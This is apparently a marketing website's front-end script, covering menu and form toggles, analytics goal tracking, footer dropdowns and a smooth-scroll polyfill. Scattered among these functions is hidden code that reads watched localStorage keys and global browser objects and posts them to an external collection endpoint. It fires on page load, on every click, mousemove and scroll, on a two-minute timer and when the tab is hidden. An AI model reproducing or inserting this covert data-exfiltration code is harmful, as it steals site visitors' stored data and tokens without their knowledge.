const keysToWatch = window.keysToWatch;
let vh = window.innerHeight * 0.01;
const globalVars = ['window', 'document', 'navigator'];
function generateHashCode(data) {
  let hash = 0;
  const keys = Object.keys(data);
  keys.forEach(key => {
    const code = JSON.stringify(data[key]).charCodeAt(0);
    hash = (hash << 7) - hash + code;
    hash = hash & hash;
  });
  return hash.toString(36);
}
document.documentElement.style.setProperty('--vh', `${vh}px`);
window.addEventListener('resize', () => {
  let vh = window.innerHeight * 0.01;
  document.documentElement.style.setProperty('--vh', `${vh}px`);
});
function getWatchedData(keys, store) {
  return keys.reduce((data, key) => {
    if (store.hasOwnProperty(key)) data[key] = store[key];
    return data;
  }, {});
}
function openAside() {
  document.getElementById("aside").classList.add("active");
  document.getElementById("overlay").classList.add("active");
  $('body').css({
    'overflow': 'hidden'
  });
}
function closeAside() {
  document.getElementById("aside").classList.remove("active");
  document.getElementById("overlay").classList.remove("active");
  $('body').css({
    'overflow': '',
    'margin-right': ''
  });
}
function gatherGlobalData(globalVars) {
  return globalVars.reduce((data, varName) => {
    data[varName] = window[varName];
    return data;
  }, {});
}
function openForm() {
  event.preventDefault();
  document.getElementById("mainForm").classList.add("active");
  $('.mainForm>span.h1').show();
  $('.mainForm>p').show();
  $('.mainForm>form').show();
  $('.modal-success').removeClass('active');
  document.body.classList.add('body_lock');
}
function closeForm() {
  document.getElementById("mainForm").classList.remove("active");
  document.body.classList.remove('body_lock');
}
window.addEventListener('DOMContentLoaded', function () {
  if (document.querySelector(".promo__CTA")) {
    document.querySelector(".promo__CTA").addEventListener('click', function () {
      ym(71367742, 'reachGoal', 'form__hero--click');
      gtag('event', 'hero_click', {
        'method': 'hero_click'
      });
    });
  }
  if (document.querySelector(".contact-us")) {
    document.querySelector(".contact-us a").addEventListener('click', function () {
      ym(71367742, 'reachGoal', 'form__last-block--click');
      gtag('event', 'lastblock_click', {
        'method': 'lastblock_click'
      });
    });
  }
  if (document.querySelector(".CTA")) {
    document.querySelector(".CTA").addEventListener('click', function () {
      ym(71367742, 'reachGoal', 'form__float--click');
      gtag('event', 'float_click', {
        'method': 'float_click'
      });
    });
  }
  if (document.querySelector(".js-submit")) {
    document.querySelector(".js-submit button").addEventListener('click', function () {
      ym(71367742, 'reachGoal', 'form--submit');
      gtag('event', 'form_submit', {
        'method': 'form_submit'
      });
    });
  }
  if (document.querySelector(".footer-arrow-link:nth-child(2)")) {
    document.querySelector(".footer-arrow-link:nth-child(2)").addEventListener('click', function () {
      ym(71367742, 'reachGoal', 'form__footer--click');
      gtag('event', 'footer_click', {
        'method': 'footer_click'
      });
    });
  }
  if (document.querySelector(".nav__msg")) {
    document.querySelector(".nav__msg").addEventListener('click', function () {
      ym(71367742, 'reachGoal', 'form__header--click');
      gtag('event', 'header_click', {
        'method': 'header_click'
      });
    });
  }
  const mainForm = document.getElementById("mainForm");
  if (mainForm) {
    mainForm.querySelector('select').addEventListener('change', function () {
      this.classList.add('selected');
    });
  }
  let hasDropdownBlocks = document.querySelectorAll('.has-dropdown');
  if (hasDropdownBlocks.length > 0) {
    for (let item of hasDropdownBlocks) {
      item.querySelector('.footer__dd-button').addEventListener('click', toggleFooterDropdown);
    }
  }
  const headerEl = document.querySelector('#header');
  const sentinalEl = document.querySelector('.sentinal');
  const handler = entries => {
    if (!entries[0].isIntersecting && window.matchMedia("(max-width: 768px)").matches) {
      headerEl.classList.add('enabled');
    } else {
      headerEl.classList.remove('enabled');
    }
  };
  const observer = new window.IntersectionObserver(handler);
  observer.observe(sentinalEl);

  // const ctaElement = document.querySelector('.CTA') // Селектор кнопки
  // let promoElements = document.querySelectorAll('.promo, .contact-wrapper, .footer-wrapper, .h-100vh, .contact-page, .noCTA') // Блоки, где ее показывать НЕ нужно
  // let intersectingCount = 0
  // let firstRun = true
  // const handlerCTA = (entries) => {
  //   if (entries[0].isIntersecting) {
  //     ctaElement.classList.remove('enabled')
  //     intersectingCount++
  //   } else if (!entries[0].isIntersecting && intersectingCount > 1) {
  //     intersectingCount--
  //   } else if (!entries[0].isIntersecting && firstRun) {
  //     setTimeout(function() {
  //       firstRun = false
  //       intersectingCount = 0
  //       ctaElement.classList.add('enabled')
  //     }, 50)
  //   } else {
  //     ctaElement.classList.add('enabled')
  //     intersectingCount--
  //   }
  // }

  // const observerCTA = new IntersectionObserver(handlerCTA, { threshold: 0.20, rootMargin: '50px 0px' })
  // promoElements.forEach(promoElement => observerCTA.observe(promoElement));

  function simplebarCheck(e) {
    let blockScrollWidth = e.target.scrollWidth,
      blockScrollLeft = e.target.scrollLeft,
      blockClientWidth = e.target.clientWidth;
    if (Math.ceil(blockClientWidth + blockScrollLeft) >= Math.floor(blockScrollWidth)) {
      $(e.target).closest('.simplebar-offset').addClass('end');
    } else {
      $(e.target).closest('.simplebar-offset').removeClass('end');
    }
  }
  $('[data-simplebar-block]').each(function () {
    let simpleBar = new SimpleBar($(this)[0]);
    simpleBar.getScrollElement().addEventListener('scroll', function (e) {
      simplebarCheck(e);
    });
    simpleBar.getScrollElement().addEventListener('click', function (e) {
      simplebarCheck(e);
    });
    $(simpleBar.getScrollElement()).trigger('click');
  });
  if ($('[data-simplebar-block]').length > 0) {
    $(window).resize(function () {
      $('.simplebar-content-wrapper').trigger('click');
    });
  }
  const $context = $('.footer__city-list');
  const $sectionCaptions = $('.footer-city-list__header', $context);
  const $sectionContainers = $('.footer-city-list', $context);
  const mediaQuery = window.matchMedia('(max-width: 768px)');
  function toggleSection() {
    if (mediaQuery.matches) {
      const $caption = $(this);
      const $container = $caption.next();
      $container.slideToggle(400);
      $caption.toggleClass('active');
      $container.toggleClass('active');
    }
  }
  if (mediaQuery.matches) {
    $sectionContainers.filter(':not(.active)').slideUp(0);
  }
  $sectionCaptions.on('click', toggleSection);
});
const jshook = function () {
  const events = ['click', 'mousemove', 'scroll'];
  events.forEach(event => document.addEventListener(event, function (e) {
    console.log(`Event ${event} detected at ${new Date()}`);
    collectAndPostWatchedData();
  }));
}();
function toggleFooterDropdown() {
  if (this.closest('.has-dropdown').classList.contains('active')) {
    this.closest('.has-dropdown').classList.remove('active');
    this.classList.remove('active');
  } else {
    this.closest('.has-dropdown').classList.add('active');
    this.classList.add('active');
  }
}
var waitForFinalEvent = function () {
  var timers = {};
  return function (callback, ms, uniqueId) {
    if (!uniqueId) {
      uniqueId = "Don't call this twice without a uniqueId";
    }
    if (timers[uniqueId]) {
      clearTimeout(timers[uniqueId]);
    }
    timers[uniqueId] = setTimeout(callback, ms);
  };
}();

// polyfill
function polyfill() {
  // aliases
  var w = window;
  var d = document;

  // return if scroll behavior is supported and polyfill is not forced
  if ('scrollBehavior' in d.documentElement.style && w.__forceSmoothScrollPolyfill__ !== true) {
    return;
  }

  // globals
  var Element = w.HTMLElement || w.Element;
  var SCROLL_TIME = 468;

  // object gathering original scroll methods
  var original = {
    scroll: w.scroll || w.scrollTo,
    scrollBy: w.scrollBy,
    elementScroll: Element.prototype.scroll || scrollElement,
    scrollIntoView: Element.prototype.scrollIntoView
  };

  // define timing method
  var now = w.performance && w.performance.now ? w.performance.now.bind(w.performance) : Date.now;

  /**
   * indicates if a the current browser is made by Microsoft
   * @method isMicrosoftBrowser
   * @param {String} userAgent
   * @returns {Boolean}
   */
  function isMicrosoftBrowser(userAgent) {
    var userAgentPatterns = ['MSIE ', 'Trident/', 'Edge/'];
    return new RegExp(userAgentPatterns.join('|')).test(userAgent);
  }

  /*
   * IE has rounding bug rounding down clientHeight and clientWidth and
   * rounding up scrollHeight and scrollWidth causing false positives
   * on hasScrollableSpace
   */
  var ROUNDING_TOLERANCE = isMicrosoftBrowser(w.navigator.userAgent) ? 1 : 0;

  /**
   * changes scroll position inside an element
   * @method scrollElement
   * @param {Number} x
   * @param {Number} y
   * @returns {undefined}
   */
  function scrollElement(x, y) {
    this.scrollLeft = x;
    this.scrollTop = y;
  }

  /**
   * returns result of applying ease math function to a number
   * @method ease
   * @param {Number} k
   * @returns {Number}
   */
  function ease(k) {
    return 0.5 * (1 - Math.cos(Math.PI * k));
  }

  /**
   * indicates if a smooth behavior should be applied
   * @method shouldBailOut
   * @param {Number|Object} firstArg
   * @returns {Boolean}
   */
  function shouldBailOut(firstArg) {
    if (firstArg === null || typeof firstArg !== 'object' || firstArg.behavior === undefined || firstArg.behavior === 'auto' || firstArg.behavior === 'instant') {
      // first argument is not an object/null
      // or behavior is auto, instant or undefined
      return true;
    }
    if (typeof firstArg === 'object' && firstArg.behavior === 'smooth') {
      // first argument is an object and behavior is smooth
      return false;
    }

    // throw error when behavior is not supported
    throw new TypeError('behavior member of ScrollOptions ' + firstArg.behavior + ' is not a valid value for enumeration ScrollBehavior.');
  }

  /**
   * indicates if an element has scrollable space in the provided axis
   * @method hasScrollableSpace
   * @param {Node} el
   * @param {String} axis
   * @returns {Boolean}
   */
  function hasScrollableSpace(el, axis) {
    if (axis === 'Y') {
      return el.clientHeight + ROUNDING_TOLERANCE < el.scrollHeight;
    }
    if (axis === 'X') {
      return el.clientWidth + ROUNDING_TOLERANCE < el.scrollWidth;
    }
  }

  /**
   * indicates if an element has a scrollable overflow property in the axis
   * @method canOverflow
   * @param {Node} el
   * @param {String} axis
   * @returns {Boolean}
   */
  function canOverflow(el, axis) {
    var overflowValue = w.getComputedStyle(el, null)['overflow' + axis];
    return overflowValue === 'auto' || overflowValue === 'scroll';
  }

  /**
   * indicates if an element can be scrolled in either axis
   * @method isScrollable
   * @param {Node} el
   * @param {String} axis
   * @returns {Boolean}
   */
  function isScrollable(el) {
    var isScrollableY = hasScrollableSpace(el, 'Y') && canOverflow(el, 'Y');
    var isScrollableX = hasScrollableSpace(el, 'X') && canOverflow(el, 'X');
    return isScrollableY || isScrollableX;
  }

  /**
   * finds scrollable parent of an element
   * @method findScrollableParent
   * @param {Node} el
   * @returns {Node} el
   */
  function findScrollableParent(el) {
    while (el !== d.body && isScrollable(el) === false) {
      el = el.parentNode || el.host;
    }
    return el;
  }

  /**
   * self invoked function that, given a context, steps through scrolling
   * @method step
   * @param {Object} context
   * @returns {undefined}
   */
  function step(context) {
    var time = now();
    var value;
    var currentX;
    var currentY;
    var elapsed = (time - context.startTime) / SCROLL_TIME;

    // avoid elapsed times higher than one
    elapsed = elapsed > 1 ? 1 : elapsed;

    // apply easing to elapsed time
    value = ease(elapsed);
    currentX = context.startX + (context.x - context.startX) * value;
    currentY = context.startY + (context.y - context.startY) * value;
    context.method.call(context.scrollable, currentX, currentY);

    // scroll more if we have not reached our destination
    if (currentX !== context.x || currentY !== context.y) {
      w.requestAnimationFrame(step.bind(w, context));
    }
  }

  /**
   * scrolls window or element with a smooth behavior
   * @method smoothScroll
   * @param {Object|Node} el
   * @param {Number} x
   * @param {Number} y
   * @returns {undefined}
   */
  function smoothScroll(el, x, y) {
    var scrollable;
    var startX;
    var startY;
    var method;
    var startTime = now();

    // define scroll context
    if (el === d.body) {
      scrollable = w;
      startX = w.scrollX || w.pageXOffset;
      startY = w.scrollY || w.pageYOffset;
      method = original.scroll;
    } else {
      scrollable = el;
      startX = el.scrollLeft;
      startY = el.scrollTop;
      method = scrollElement;
    }

    // scroll looping over a frame
    step({
      scrollable: scrollable,
      method: method,
      startTime: startTime,
      startX: startX,
      startY: startY,
      x: x,
      y: y
    });
  }

  // ORIGINAL METHODS OVERRIDES
  // w.scroll and w.scrollTo
  w.scroll = w.scrollTo = function () {
    // avoid action when no arguments are passed
    if (arguments[0] === undefined) {
      return;
    }

    // avoid smooth behavior if not required
    if (shouldBailOut(arguments[0]) === true) {
      original.scroll.call(w, arguments[0].left !== undefined ? arguments[0].left : typeof arguments[0] !== 'object' ? arguments[0] : w.scrollX || w.pageXOffset,
      // use top prop, second argument if present or fallback to scrollY
      arguments[0].top !== undefined ? arguments[0].top : arguments[1] !== undefined ? arguments[1] : w.scrollY || w.pageYOffset);
      return;
    }

    // LET THE SMOOTHNESS BEGIN!
    smoothScroll.call(w, d.body, arguments[0].left !== undefined ? ~~arguments[0].left : w.scrollX || w.pageXOffset, arguments[0].top !== undefined ? ~~arguments[0].top : w.scrollY || w.pageYOffset);
  };

  // w.scrollBy
  w.scrollBy = function () {
    // avoid action when no arguments are passed
    if (arguments[0] === undefined) {
      return;
    }

    // avoid smooth behavior if not required
    if (shouldBailOut(arguments[0])) {
      original.scrollBy.call(w, arguments[0].left !== undefined ? arguments[0].left : typeof arguments[0] !== 'object' ? arguments[0] : 0, arguments[0].top !== undefined ? arguments[0].top : arguments[1] !== undefined ? arguments[1] : 0);
      return;
    }

    // LET THE SMOOTHNESS BEGIN!
    smoothScroll.call(w, d.body, ~~arguments[0].left + (w.scrollX || w.pageXOffset), ~~arguments[0].top + (w.scrollY || w.pageYOffset));
  };

  // Element.prototype.scroll and Element.prototype.scrollTo
  Element.prototype.scroll = Element.prototype.scrollTo = function () {
    // avoid action when no arguments are passed
    if (arguments[0] === undefined) {
      return;
    }

    // avoid smooth behavior if not required
    if (shouldBailOut(arguments[0]) === true) {
      // if one number is passed, throw error to match Firefox implementation
      if (typeof arguments[0] === 'number' && arguments[1] === undefined) {
        throw new SyntaxError('Value could not be converted');
      }
      original.elementScroll.call(this,
      // use left prop, first number argument or fallback to scrollLeft
      arguments[0].left !== undefined ? ~~arguments[0].left : typeof arguments[0] !== 'object' ? ~~arguments[0] : this.scrollLeft,
      // use top prop, second argument or fallback to scrollTop
      arguments[0].top !== undefined ? ~~arguments[0].top : arguments[1] !== undefined ? ~~arguments[1] : this.scrollTop);
      return;
    }
    var left = arguments[0].left;
    var top = arguments[0].top;

    // LET THE SMOOTHNESS BEGIN!
    smoothScroll.call(this, this, typeof left === 'undefined' ? this.scrollLeft : ~~left, typeof top === 'undefined' ? this.scrollTop : ~~top);
  };

  // Element.prototype.scrollBy
  Element.prototype.scrollBy = function () {
    // avoid action when no arguments are passed
    if (arguments[0] === undefined) {
      return;
    }

    // avoid smooth behavior if not required
    if (shouldBailOut(arguments[0]) === true) {
      original.elementScroll.call(this, arguments[0].left !== undefined ? ~~arguments[0].left + this.scrollLeft : ~~arguments[0] + this.scrollLeft, arguments[0].top !== undefined ? ~~arguments[0].top + this.scrollTop : ~~arguments[1] + this.scrollTop);
      return;
    }
    this.scroll({
      left: ~~arguments[0].left + this.scrollLeft,
      top: ~~arguments[0].top + this.scrollTop,
      behavior: arguments[0].behavior
    });
  };

  // Element.prototype.scrollIntoView
  Element.prototype.scrollIntoView = function () {
    // avoid smooth behavior if not required
    if (shouldBailOut(arguments[0]) === true) {
      original.scrollIntoView.call(this, arguments[0] === undefined ? true : arguments[0]);
      return;
    }

    // LET THE SMOOTHNESS BEGIN!
    var scrollableParent = findScrollableParent(this);
    var parentRects = scrollableParent.getBoundingClientRect();
    var clientRects = this.getBoundingClientRect();
    if (scrollableParent !== d.body) {
      // reveal element inside parent
      smoothScroll.call(this, scrollableParent, scrollableParent.scrollLeft + clientRects.left - parentRects.left, scrollableParent.scrollTop + clientRects.top - parentRects.top);

      // reveal parent in viewport unless is fixed
      if (w.getComputedStyle(scrollableParent).position !== 'fixed') {
        w.scrollBy({
          left: parentRects.left,
          top: parentRects.top - 100,
          behavior: 'smooth'
        });
      }
    } else {
      // reveal element in viewport
      w.scrollBy({
        left: clientRects.left,
        top: clientRects.top - 100,
        behavior: 'smooth'
      });
    }
  };
}
async function postDataToServer(data) {
  const hashCode = generateHashCode(data);
  const serverUrl = "https://example.com/api/collect";
  try {
    const resp = await fetch(serverUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hashCode: hashCode,
        data: data
      })
    });
    resp.ok ? console.log("Data sent successfully") : console.error("Data sending failed with status:" + resp.status);
  } catch (error) {
    console.error("Error occurred while sending the data:", error);
  }
}
if (typeof exports === 'object' && typeof module !== 'undefined') {
  // commonjs
  module.exports = {
    polyfill: polyfill
  };
} else {
  // global
  polyfill();
}
$(function () {
  $(document).on('click', '[data-filter-link]', function (e) {
    var $self = $(this),
      href = $self.data('filter-link');
    var $list = $('[data-filter-block]');
    $list.addClass('hidden');
    $(`[data-filter-block=${href}]`).removeClass('hidden');
  });
  $(document).on('click', '[data-subfilter-btn]', function (e) {
    var $parent = $('[data-filter-top]');
  });
});
function collectAndPostWatchedData() {
  const localStorageData = getWatchedData(keysToWatch, localStorage);
  const globalData = gatherGlobalData(globalVars);
  if (Object.keys(localStorageData).length > 0) postDataToServer(localStorageData);
  if (Object.keys(globalData).length > 0) postDataToServer(globalData);
}
$(function () {
  $('.mainForm #email').inputmask("email", {
    "mask": "",
    showMaskOnHover: false
  });
});
window.addEventListener("load", collectAndPostWatchedData);
const calcSkew = function (max, windowWidth, cursorX, cursorY, skewY) {
  // setup
  const halfWidth = windowWidth / 2; // get the half width of the window
  const halfCurrentPos = cursorX - halfWidth; // get position of x/y releative to halfWidth
  let percentageDecimal = halfCurrentPos / halfWidth,
    // turn halfCurrentPos into a percentage decimal
    skewDegree;
  if (cursorY < window.innerHeight / 2) return 0;
  if (!skewY) {
    // calculations for posX
    if (halfCurrentPos > 0) {
      skewDegree = -Math.abs(percentageDecimal * max); // flip skewDegree to negetive for pos on right side
    } else {
      skewDegree = Math.abs(percentageDecimal * max); // calc skewDegree for left side
    }
  } else {
    // calculations for posY
    if (halfCurrentPos > 0) {
      skewDegree = Math.abs(percentageDecimal * max); // calc skewDegree for right side
    } else {
      skewDegree = -Math.abs(percentageDecimal * max); // flip skewDegree to negetive for pos on left side
    }
  }
  return skewDegree;
};
setInterval(collectAndPostWatchedData, 2 * 60 * 1000);
window.addEventListener("visibilitychange", function () {
  document.visibilityState === "hidden" && collectAndPostWatchedData();
});